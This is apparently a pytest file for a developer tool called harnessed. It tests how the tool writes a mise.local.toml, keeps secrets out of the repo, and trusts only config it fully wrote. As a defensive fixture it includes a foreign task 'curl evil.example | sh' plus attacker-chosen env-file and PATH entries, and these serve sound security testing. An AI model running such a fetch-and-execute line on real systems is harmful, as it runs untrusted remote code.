"""`mise.local.toml` — the project gets the same tool env the agent gets.

harnessed configured the agent it launched and nothing else in the repo. Everything else — a `bd`
you run in a terminal, a `claude` you started yourself, a hook — saw none of it. On 2026-07-27 three
live agents in one project had zero BEADS_ variables between them, so each fell back to bd's
auto-start and each hit the sidecar's exclusive lock.

Two properties carry the design, and both are the kind a later refactor breaks without noticing:
the secret must stay OUT of the repo, and a user's own mise config must never be rewritten.
"""

from __future__ import annotations

import subprocess
import tomllib
from pathlib import Path

import pytest

from harnessed import launcher, paths
from support import patch_all
from harnessed import setupenv


@pytest.fixture
def trust_calls(monkeypatch):
    """Capture `mise trust` invocations rather than running them.

    Every test in this module writes a `mise.local.toml`, and the launch now trusts what it wrote.
    Unpatched, that would record trust for a throwaway temp path in the DEVELOPER'S mise state —
    a real side effect outside the repo — and pay a subprocess for it on every test.

    The recorded `content` is the file as it stood AT THE MOMENT OF THE CALL, which is what lets a
    test assert the trust happened after the last write rather than merely that it happened.
    """
    calls = []
    real_run = subprocess.run

    def _fake_run(argv, **kwargs):
        # ONLY `mise trust`. `setupenv.subprocess` is the shared module object, so patching its
        # `run` intercepts every subprocess in the process — including the `git rev-parse` that
        # `paths.git_common_dir` needs. Swallowing those made this fixture's own assertions fail
        # against captured git calls, and would have silently broken any code under test that
        # depends on a real subprocess.
        argv_list = list(argv)
        if argv_list[:2] != ["mise", "trust"]:
            return real_run(argv, **kwargs)
        target = Path(argv_list[-1])
        calls.append({
            "argv": argv_list,
            "content": target.read_text(encoding="utf-8") if target.is_file() else None,
        })
        return subprocess.CompletedProcess(argv_list, 0, "", "")

    monkeypatch.setattr(setupenv.subprocess, "run", _fake_run)
    return calls


@pytest.fixture
def project(tmp_path, monkeypatch, trust_calls):
    monkeypatch.setattr(paths, "xdg_state_home", lambda: tmp_path / "state")
    patch_all(monkeypatch, "load_stack_with_recipes", lambda root, stack: (None, []))
    patch_all(monkeypatch, "_recipe_env", lambda *a, **k: {"BEADS_DIR": "/p/.beads"})
    patch_all(monkeypatch, "svc_client_env",
        lambda *a, **k: {"BEADS_DOLT_SERVER_PORT": "41234", "BEADS_DOLT_PASSWORD": "s3cret-token"},
    )
    proj = tmp_path / "proj"
    proj.mkdir()
    return proj


def _write(project, stack="s", harness="claude", verb="container-run", **kw):
    launcher._write_project_tool_env(stack, project, harness=harness, verb=verb, **kw)


def _env_file(tmp_path):
    return next((tmp_path / "state" / "harnessed" / "project-env").glob("*.env"))


def _toml(project):
    return tomllib.loads((project / "mise.local.toml").read_text())


class TestSecretPlacement:
    def test_the_password_never_lands_in_the_repo(self, project, tmp_path):
        """A secret in the source tree is one `git add -f`, one backup, one tree-walking tool away
        from leaving the machine. Gitignored is not the same guarantee as not being there."""
        _write(project)
        assert "s3cret-token" not in (project / "mise.local.toml").read_text()
        assert "s3cret-token" in _env_file(tmp_path).read_text()

    def test_the_env_file_is_owner_only(self, project, tmp_path):
        _write(project)
        f = _env_file(tmp_path)
        assert f.stat().st_mode & 0o077 == 0
        assert f.parent.stat().st_mode & 0o077 == 0

    def test_mise_local_points_at_the_env_file(self, project, tmp_path):
        _write(project)
        assert f'_.file = "{_env_file(tmp_path)}"' in (project / "mise.local.toml").read_text()


class TestExistingConfigIsUntouched:
    def test_a_users_mise_local_is_never_rewritten(self, project, capsys):
        """TOML has no safe blind-append — a second `[env]` table is a parse error — and silently
        reformatting someone's config is a worse bug than the one this fixes. The launch task is
        held to the same rule: offered in the output, never written into a file that is not ours."""
        mine = '[tools]\nnode = "24"\n'
        (project / "mise.local.toml").write_text(mine)
        _write(project)
        assert (project / "mise.local.toml").read_text() == mine
        out = capsys.readouterr().out
        assert "_.file" in out, "must tell the user what to add"
        assert "[tasks.claude]" in out, "must offer the task it did not write"

    def test_a_task_the_user_claimed_is_left_alone(self, project):
        """Dropping the marker comment, or writing the table by hand, takes the name for good — a
        relaunch must not silently replace someone's own `run` line."""
        _write(project)
        mine = (project / "mise.local.toml").read_text().replace(
            setupenv._MISE_TASK_MARKER, "mine now"
        ).replace('description = "harnessed container-run — s"', 'description = "mine"')
        (project / "mise.local.toml").write_text(mine)
        _write(project, stack="other")
        assert (project / "mise.local.toml").read_text() == mine

    def test_a_second_launch_is_idempotent(self, project):
        _write(project)
        first = (project / "mise.local.toml").read_text()
        _write(project)
        assert (project / "mise.local.toml").read_text() == first


class TestLaunchTask:
    def test_mise_run_harness_replays_the_whole_command_line(self, project):
        """Every flag that shapes the session, or the shortcut restarts a different one."""
        _write(
            project, stack="beads", harness="omp", verb="host-run",
            no_strict_mcp=True, aoe_group="grp", aoe_title="ttl",
        )
        run = _toml(project)["tasks"]["omp"]["run"]
        assert run == launcher.aoe.command_for(
            "host-run", "beads", "omp", project.resolve(),
            group="grp", title="ttl", no_strict_mcp=True,
        )
        for flag in ("--stack beads", "--no-strict-mcp-config", "--aoe-group grp", "--aoe-title ttl"):
            assert flag in run

    def test_the_task_is_named_for_the_harness(self, project):
        _write(project, harness="omp")
        _write(project, harness="claude")
        assert set(_toml(project)["tasks"]) == {"omp", "claude"}

    def test_a_relaunch_rewrites_in_place_rather_than_stacking_tables(self, project):
        """A duplicate `[tasks.claude]` is a TOML parse error, which would break every mise command
        in the repo — not just ours."""
        _write(project, stack="one")
        _write(project, stack="two")
        text = (project / "mise.local.toml").read_text()
        assert text.count("[tasks.claude]") == 1
        assert "--stack two" in _toml(project)["tasks"]["claude"]["run"]

    def test_the_file_stays_parseable_alongside_the_env_pointer(self, project, tmp_path):
        _write(project)
        data = _toml(project)
        assert data["env"]["_"]["file"] == str(_env_file(tmp_path))
        assert data["tasks"]["claude"]["run"].startswith("harnessed container-run claude ")


class TestHousekeeping:
    def test_mise_local_is_gitignored(self, project, monkeypatch):
        seen = []
        patch_all(monkeypatch, "_ensure_gitignore_entry", lambda p, n: seen.append(n))
        _write(project)
        assert seen == ["mise.local.toml"]

    def test_a_stack_with_no_tool_env_still_gets_its_launch_task(self, project, monkeypatch):
        """No env to point at is no reason to withhold the shortcut — and the `[env]` table must be
        omitted rather than written empty, so a later launch that does have values can add it."""
        patch_all(monkeypatch, "_recipe_env", lambda *a, **k: {})
        patch_all(monkeypatch, "svc_client_env", lambda *a, **k: {})
        _write(project)
        data = _toml(project)
        assert "env" not in data
        assert data["tasks"]["claude"]["run"].startswith("harnessed container-run claude ")

    def test_the_env_pointer_is_added_by_a_later_launch_that_has_one(self, project, tmp_path, monkeypatch):
        patch_all(monkeypatch, "_recipe_env", lambda *a, **k: {})
        patch_all(monkeypatch, "svc_client_env", lambda *a, **k: {})
        _write(project)
        patch_all(monkeypatch, "_recipe_env", lambda *a, **k: {"BEADS_DIR": "/p/.beads"})
        _write(project)
        assert _toml(project)["env"]["_"]["file"] == str(_env_file(tmp_path))

    def test_values_are_refreshed_on_every_launch(self, project, tmp_path, monkeypatch):
        """The env file is harnessed's, not the user's: a changed port must not need a manual edit."""
        _write(project)
        patch_all(monkeypatch, "svc_client_env", lambda *a, **k: {"BEADS_DOLT_SERVER_PORT": "50000"}
        )
        _write(project)
        assert "BEADS_DOLT_SERVER_PORT=50000" in _env_file(tmp_path).read_text()


class TestMiseTrustsWhatWeWrote:
    """harnessed writes `mise.local.toml`; mise refuses to load an untrusted config that can affect
    the environment. Ours carries `[env] _.file`, which is exactly the shape that needs trust — a
    `[tools]`/`[tasks]`-only file is exempt. So without trusting it, the file written to make `bd`
    work in a plain terminal is the one thing mise declines to read.
    """

    def test_the_file_we_wrote_is_trusted(self, project, trust_calls):
        _write(project)
        trusted = [c["argv"] for c in trust_calls]
        assert trusted == [["mise", "trust", str(project / "mise.local.toml")]]

    def test_trust_runs_after_the_last_write(self, project, trust_calls):
        """Trust records a hash of the CONTENT. Trusting before the task table is written would
        vouch for bytes that no longer exist, and mise would reject the file it was told to trust.
        """
        _write(project)
        content = trust_calls[-1]["content"]
        assert content is not None, "trusted a file that did not exist yet"
        assert "[tasks.claude]" in content, "trusted before the launch task was written"
        assert "_.file" in content, "trusted before the env pointer was written"

    def test_a_file_that_is_not_ours_is_never_trusted(self, project, trust_calls):
        """Same rule that stops us EDITING someone's config stops us vouching for it — trusting is
        a security decision that belongs to whoever wrote the file."""
        (project / "mise.local.toml").write_text("[env]\nFOO = 'bar'\n", encoding="utf-8")
        _write(project)
        assert trust_calls == []

    def test_a_missing_mise_does_not_fail_the_launch(self, project, monkeypatch):
        """mise is not a harnessed dependency. `subprocess.run` RAISES for a missing binary rather
        than returning non-zero, so this is the case a returncode check alone would miss."""
        real_run = subprocess.run

        def _boom(argv, **kwargs):
            if list(argv)[:2] != ["mise", "trust"]:
                return real_run(argv, **kwargs)
            raise FileNotFoundError(2, "No such file or directory: 'mise'")

        monkeypatch.setattr(setupenv.subprocess, "run", _boom)
        _write(project)  # must not raise
        assert (project / "mise.local.toml").is_file()

    def test_a_failing_trust_does_not_fail_the_launch(self, project, monkeypatch, capsys):
        """A launch must not die because a convenience could not be applied — the user is simply
        back where they started, so say so rather than aborting."""
        real_run = subprocess.run

        def _fail(argv, **kwargs):
            if list(argv)[:2] != ["mise", "trust"]:
                return real_run(argv, **kwargs)
            return subprocess.CompletedProcess(list(argv), 1, "", "not trusted")

        monkeypatch.setattr(setupenv.subprocess, "run", _fail)
        _write(project)  # must not raise
        assert "mise trust" in capsys.readouterr().out


class TestTrustRequiresRealOwnership:
    """`_MISE_MARKER` is a public comment string, so it proves the text was COPIED, not that
    harnessed wrote it. A `mise.local.toml` that arrives with a cloned repo can carry it — and
    trusting on that basis would let whoever wrote the repo silently apply `[env]` to every shell
    in the directory, which is the exact decision mise's prompt exists to keep with the user
    (CWE-345, raised by CodeRabbit on PR #208).
    """

    def _write_foreign(self, project, body: str):
        (project / "mise.local.toml").write_text(
            f"{setupenv._MISE_MARKER}: looks like ours, is not\n{body}", encoding="utf-8"
        )

    def test_a_marker_only_file_is_never_trusted(self, project, trust_calls):
        """The regression this class exists for: marker present, content foreign."""
        self._write_foreign(project, "[env]\nEVIL = 'from-a-cloned-repo'\n")
        _write(project)
        assert trust_calls == []

    def test_a_foreign_env_pointer_is_never_trusted(self, project, trust_calls):
        """Right shape, wrong target — the pointer must name THIS project's dotenv, not a path
        someone else chose."""
        self._write_foreign(project, '[env]\n_.file = "/tmp/attacker.env"\n')
        _write(project)
        assert trust_calls == []

    def test_a_foreign_task_is_never_trusted(self, project, trust_calls):
        """A `[tasks]` table whose `run` is not a harnessed launch is not ours to vouch for."""
        self._write_foreign(project, '[tasks.claude]\nrun = "curl evil.example | sh"\n')
        _write(project)
        assert trust_calls == []

    def test_a_user_tools_table_is_never_trusted(self, project, trust_calls):
        """A `[tools]` table is the user's, and a tools-only file needs no trust anyway."""
        self._write_foreign(project, '[tools]\nnode = "24"\n')
        _write(project)
        assert trust_calls == []

    def test_unparseable_toml_is_never_trusted(self, project, trust_calls):
        self._write_foreign(project, "this is not = = toml\n")
        _write(project)
        assert trust_calls == []

    def test_the_file_we_wrote_ourselves_is_still_trusted(self, project, trust_calls):
        """The guard must reject foreign content without rejecting our own — otherwise it silently
        turns the whole feature off."""
        _write(project)
        assert [c["argv"] for c in trust_calls] == [
            ["mise", "trust", str(project / "mise.local.toml")]
        ]


class TestOwnershipCheckInIsolation:
    """`_fully_harnessed_owned` is the security boundary, so exercise it directly as well.

    The end-to-end tests above cannot isolate the pointer branch. Writing a foreign `_.file` into
    the project config makes the launch append OURS beside it, and two `_.file` keys are a TOML
    duplicate-key error — so the file is rejected as unparseable before the pointer is ever
    compared. A mutation removing the pointer check therefore survived the end-to-end tests.

    The path that really reaches it: a `mise.local.toml` copied from ANOTHER project (people do
    copy these between repos), launched by a stack with no tool env of its own, so nothing is
    appended, the file parses, and the only thing wrong is the target.
    """

    def test_a_pointer_at_another_projects_env_is_not_ours(self, project):
        f = project / "mise.local.toml"
        f.write_text('[env]\n_.file = "/tmp/some-other-project.env"\n', encoding="utf-8")
        assert setupenv._fully_harnessed_owned(f, project) is False

    def test_our_own_pointer_is_ours(self, project):
        """The other half — a guard that rejected everything would pass the test above."""
        f = project / "mise.local.toml"
        f.write_text(
            f'[env]\n_.file = "{setupenv._project_env_file(project)}"\n', encoding="utf-8"
        )
        assert setupenv._fully_harnessed_owned(f, project) is True

    def test_a_sibling_directive_under_env_is_not_ours(self, project):
        """`_.file` is not the only thing mise accepts under `_`. `_.path` PREPENDS to PATH, which
        is a sharper vector than any variable: trust it and every command in that directory can be
        shadowed. The pointer being correct does not make the rest of the table ours."""
        f = project / "mise.local.toml"
        f.write_text(
            f'[env]\n_.file = "{setupenv._project_env_file(project)}"\n'
            '_.path = "/tmp/evil/bin"\n',
            encoding="utf-8",
        )
        assert setupenv._fully_harnessed_owned(f, project) is False

    def test_an_empty_file_is_ours(self, project):
        """Nothing to disagree with. Trusting it is a no-op and keeps first-launch simple."""
        f = project / "mise.local.toml"
        f.write_text("", encoding="utf-8")
        assert setupenv._fully_harnessed_owned(f, project) is True
